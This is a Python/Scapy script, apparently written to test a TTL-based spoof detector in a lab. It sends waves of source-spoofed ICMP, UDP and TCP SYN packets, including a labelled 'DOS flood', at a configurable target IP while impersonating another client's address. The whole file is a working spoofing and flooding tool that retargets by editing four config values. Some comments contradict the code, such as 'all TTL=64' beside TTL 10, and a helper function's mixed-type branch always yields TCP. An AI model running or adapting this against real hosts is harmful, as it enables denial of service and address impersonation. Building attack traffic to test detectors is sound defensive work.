#!/usr/bin/env python3
"""
attack_hardcoded_nomarker.py - Deterministic IP-spoofing test attacker (no markers)

- Hard-coded TTL sequences per wave (deterministic).
- Prints only wave headers, coarse progress, and a TTL-distribution summary per wave.
- Uses SPOOFED_IP as the packet source so it actually spoofs the client IP.
- No marker packets, no randomness, no wave 4.

Usage:
  - Adjust INTERFACE_USED, REAL_ATTACKER_IP, TARGET_IP, SPOOFED_IP to match your lab.
  - Run detect.py (baseline mode) and client.py (if needed) first.
  - Then run this attacker.
"""
import time
from scapy.all import IP, UDP, TCP, ICMP, send, conf

# ---------------- CONFIG ----------------
INTERFACE_USED = "\\Device\\NPF_Loopback"   # copy exact name from scapy.show_interfaces()
REAL_ATTACKER_IP = "10.1.1.30"              # attacker machine real IP (unused for spoofed pkts)
TARGET_IP = "10.1.1.10"                     # detector / victim IP
SPOOFED_IP = "10.1.1.20"                    # impersonated legitimate client IP

# Waves: (name, packet_count, inter_packet_delay, ttl_sequence, pkt_type)
# pkt_type: "ICMP", "UDP", "TCP", or "MIXED" (deterministic cycle)
WAVES = [
    ("DOS flood", 200, 0.02, [128], "MIXED"),            # high-rate flood with TTL fixed at 128
    ("TTL spoof", 20, 0.08, [10], "ICMP"),               # TTL-only spoof wave (all TTL=64)
    ("Mixed attack", 150, 0.03, [255], "MIXED"),  # deterministic sequence
]
# remove any extra waves (no wave 4)

# Small prints cadence (how many progress reports per wave)
PROGRESS_STEPS = 10
# -----------------------------------------

def build_pkt(spoofed_src, dst, ttl, pkt_type):
    """Return a packet with spoofed source, TTL and chosen type."""
    if pkt_type == "ICMP":
        return IP(src=spoofed_src, dst=dst, ttl=ttl)/ICMP()
    if pkt_type == "UDP":
        return IP(src=spoofed_src, dst=dst, ttl=ttl)/UDP(dport=53, sport=12345)
    if pkt_type == "TCP":
        return IP(src=spoofed_src, dst=dst, ttl=ttl)/TCP(dport=80, flags='S', sport=12345)
    # MIXED deterministic cycle
    seq = ["TCP", "UDP", "ICMP"]
    t = seq[0]
    return build_pkt(spoofed_src, dst, ttl, t)

def launch():
    conf.iface = INTERFACE_USED
    print("=== HARD-CODED ATTACKER (NO MARKER) STARTED ===")
    print(f"Interface: {INTERFACE_USED}")
    print(f"Real attacker IP: {REAL_ATTACKER_IP}")
    print(f"Target: {TARGET_IP} | Spoofing as: {SPOOFED_IP}\n")

    print("WAVE PLAN:")
    for i, w in enumerate(WAVES, 1):
        name, count, delay, ttls, ptype = w
        print(f"  {i}) {name} -> {count} pkts, TTLs={ttls}, type={ptype}, delay={delay}s")
    print("\nPress Ctrl+C to stop early.\n")

    total_sent = 0
    start_time = time.time()

    try:
        for wave_idx, wave in enumerate(WAVES, start=1):
            name, count, inter_delay, ttl_list, pkt_type = wave
            print(f"\n--- WAVE {wave_idx}: {name} ---")
            sent_in_wave = 0

            # prepare deterministic pkt-type cycle for MIXED
            mixed_seq = ["TCP", "UDP", "ICMP"]

            # compute progress interval to avoid printing each packet
            progress_interval = max(1, count // PROGRESS_STEPS)

            for i in range(count):
                # deterministic TTL selection (cycled through ttl_list)
                ttl = ttl_list[i % len(ttl_list)]

                # pick packet type deterministically
                if pkt_type == "MIXED":
                    ptype = mixed_seq[i % len(mixed_seq)]
                else:
                    ptype = pkt_type

                # construct packet using spoofed source (this is the actual spoof)
                pkt = None
                if ptype == "ICMP":
                    pkt = IP(src=SPOOFED_IP, dst=TARGET_IP, ttl=ttl)/ICMP()
                elif ptype == "UDP":
                    pkt = IP(src=SPOOFED_IP, dst=TARGET_IP, ttl=ttl)/UDP(dport=53, sport=12345)
                else:  # TCP
                    pkt = IP(src=SPOOFED_IP, dst=TARGET_IP, ttl=ttl)/TCP(dport=80, flags='S', sport=12345)

                send(pkt, verbose=0)
                sent_in_wave += 1
                total_sent += 1

                # coarse progress printing
                if (sent_in_wave % progress_interval == 0) or (i == count - 1):
                    print(f"  Sent {sent_in_wave}/{count} pkts (last TTL={ttl}, TYPE={ptype})")

                time.sleep(inter_delay)

            # wave TTL distribution summary (deterministic)
            dist = {}
            for i in range(count):
                t = ttl_list[i % len(ttl_list)]
                dist[t] = dist.get(t, 0) + 1
            dist_str = ", ".join([f"TTL={k}:{v}" for k, v in sorted(dist.items())])
            print(f"Wave '{name}' complete ({count} packets). TTL distribution: {dist_str}")

            # small pause between waves
            time.sleep(3.0)

    except KeyboardInterrupt:
        print("\n[ATTACKER] Stopped early by user (Ctrl+C).")

    finally:
        dur = time.time() - start_time
        print("\n=== ATTACK SUMMARY ===")
        print(f"Total spoofed packets sent: {total_sent}")
        print(f"Duration: {dur:.2f}s | Avg rate: {total_sent/dur if dur>0 else 0:.2f} pkt/s")
        print("Done. Ensure detector baseline ran before starting this attacker.")

if __name__ == "__main__":
    launch()
